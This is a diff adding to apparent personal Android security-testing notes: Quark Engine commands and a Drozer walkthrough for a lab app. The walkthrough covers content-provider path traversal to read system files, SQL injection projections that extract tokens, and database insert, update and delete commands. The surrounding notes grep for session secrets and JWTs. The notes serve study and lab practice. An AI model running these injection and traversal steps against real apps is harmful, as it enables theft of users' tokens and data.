@@ -35,6 +35,9 @@ Key Features of Quark Engine
 5. API Calls and Tracking -	Tracks API calls, especially those accessing sensitive system resources or user data, to detect suspicious activity.
 6. Dynamic Analysis -	Complements static analysis by observing app behavior at runtime, helping detect actions triggered only under specific conditions..
 7. Graphical Reports	- Quark generates visual representations of behavior flows and interactions, simplifying the understanding of complex threat patterns.
+8. Classifying Crime Rules - quark -s -a myapp.apk -r quark-rules -t 100 -c
+9. Web Report - quark -s -a myapp.apk -r quark-rules -t 100 -w report
+10. 
 
 **Installation & Usage**
 1. python3 -m venv quark
@@ -57,8 +60,51 @@ Key Features of Quark Engine
  7.   chmod -R u+rX /home/kali/Desktop/quark-rules (if needed for permission)
  8.   quark -s -a myapp.apk -r  /home/kali/Desktop/quark-rules/rules -t 100 -w report.html
  9.   quark -s -a myapp.apk -r  /home/kali/Desktop/quark-rules/rules -t 100 -w /home/kali/Desktop/report2
+________________________________________________________________________________________________________________________________________________
+
+**Drozer**
+Drozer is a security testing framework that allows you to operate as if you're another Android application, enabling direct interaction with other apps, the operating system, and the device itself. This perspective closely mimics how a real, installed app would behave on the system, making it ideal for identifying inter-app communication vulnerabilities and misconfigurations.
+(detective app for Android that pretends to be another app so it can check how that app and the phone behave)
+(Drozer = a hired tester who dresses up as a normal app and walks around the phone asking, “Hey, can I use this?” If things answer “yes” when they shouldn’t, that’s a vulnerability.)
+
+**Key Features**
+**Feature**	              **Description**
+Security Testing          : Framework	Drozer offers a robust framework with built-in modules that simulate various attack scenarios.
+App Interaction	        :Enables interaction with Android's Inter-Process Communication (IPC) components such as content providers, broadcast receivers, and services. This allows testers to probe and exploit                              exposed components in other apps.
+Command-line Interface	  :Operates via a powerful CLI, ideal for fast testing, automation, and integration into custom penetration testing workflows or scripts.
+Module-based Architecture :Designed with extensibility in mind, Drozer supports writing custom modules in Python, enabling testers to create app-specific or system-specific security checks.
 
 
+Commands:
+1. adb devices -l
+2. adb -s 28061JEGR08933 tcpip 5555 -> Tell device to listen on TCP 5555 (while USB plugged in)
+3. adb -s 28061JEGR08933 shell ip -f inet addr show wlan0 -> Get device IP (if you already ran earlier and have 192.168.1.3, skip step 4 — otherwise run)
+4. adb connect <ip>:<port> -> Connect ADB over Wi-Fi
+5. adb -s <ip>:<port> forward tcp:31415 tcp:3141 -> Forward the Drozer port and connect the console
+6. adb -s <ip>:<port> install -r myapp.apk -> Transerfering the apk
+7. pipx install drozer -> install of drozer
+8. on the device ont he drozer
+9. run app.package.list -> list all the packages installed on the device
+10. run app.package.list -f MyNoteBook -> We can also specify the filter MyNoteBook (the name of the app we want to assess) to find only the package name of the app we are interested in.
+11. run app.package.info -a <package name> -> some general information about this app
+12. run app.package.manifest <package name> -> read the manifest file for this application
+13. run app.package.attacksurface <pakage name> -> components of the application are accessible to other apps
+14. run scanner.provider.traversal -a <package name> ->  if there are any content providers vulnerable to Path Traversal attacks.
+15. run app.provider.read <Vuerbale path from path traversal attack content://provide the url>/../../../system/etc/hosts -> use another module read the contents of the file /system/etc/hosts by exploiting the vulnerable content provider. ( ex. run app.provider.read content://com.hackthebox.myapp.fileprovider/../../../system/etc/hosts)
+16. run scanner.provider.finduris -a <package name> -> explore the providers available URIs. (URLs accessible to other apps)
+                                                       This module scans the target app for exported Content Providers and tries to discover any accessible URIs (like database paths).
+18. run scanner.provider.injection -a <package name> -> to scan the app for content providers vulnerable to SQL injection
+    Projection and Selection parameters. In this context, Projection defines which columns are returned in a query, while Selection corresponds to the WHERE clause used to filter rows
+19. run scanner.provider.sqltables -a <package name> -> module that automatically exploits the identified injection points and tries to enumerate the database tables.
+    run app.provider.query <paste the url with content:URL where sql is vulerbale> -> module to query the default table associated with this URI
+20. jadx-gui myapp.apk -> check for code where the database is initialized (db).
+21. run app.provider.query  --projection "<column1>, <column2>" -> exploit the SQL injection behavior to further read data
+22. run app.provider.query <content://provider_uri> --projection "<column1>, <column2>, (SELECT token FROM Tokens)" -> select token fromm token needs to be changed when we see the db file
+23. run app.provider.insert <content://provider_uri> --int <column1> 2 --string <column2> test ->  insert new entries into the database. number 2 and test
+24. run app.provider.query <content://provider_uri> --projection "<column1>, <column2>" -> to check where new data has been added are not
+25. run app.provider.update <content://provider_uri> --selection "<column1>=?" --selection-args 2 --string <column2> doe -> Update Existing Entries all data changes as per db or data is stored
+26. run app.provider.delete <content://provider_uri> --selection "<column1>=?" --selection-args 2 -> Delete Existing Entry (delete the entry with _id = 2 )
+27. 
 
 _________________________________________________________________________________________________________________________________________________
 
@@ -82,3 +128,7 @@ Step 3: below command to find data
 11. find . -type f -exec strings {} \; | grep -iE '(_updateSessionFromEvent|getSession|setSession|_session|session|sessions|onPanSessionStart|computeSecret|keyFromSecret|fromSecret|getSecret|PasswordBasedCipher|withXSRFToken|cancelToken|XSRF-TOKEN|X-XSRF-TOKEN|authorization|proxy-authorization|CancelToken)'
 12. find . -type f -exec strings {} \; | grep -E 'eyJ[A-Za-z0-9_-]{10,}.*\.eyJ[A-Za-z0-9_-]{10,}\..*'
 
+
+**********Android Command***************
+1. jadx-gui myapp.apk
+2. 
